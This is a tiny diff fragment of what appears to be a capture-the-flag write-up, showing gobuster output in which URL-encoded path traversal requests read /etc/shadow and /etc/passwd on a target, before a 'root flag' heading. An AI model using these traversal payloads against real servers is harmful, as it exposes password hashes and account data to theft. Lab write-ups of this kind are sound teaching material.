@@ -503,7 +503,6 @@ gobuster lfi output:
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow (Status: 200) [Size: 1343]
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd (Status: 200) [Size: 1984]
 ///////../../../etc/passwd (Status: 403) [Size: 14]
-
 ```
 
 root flag:
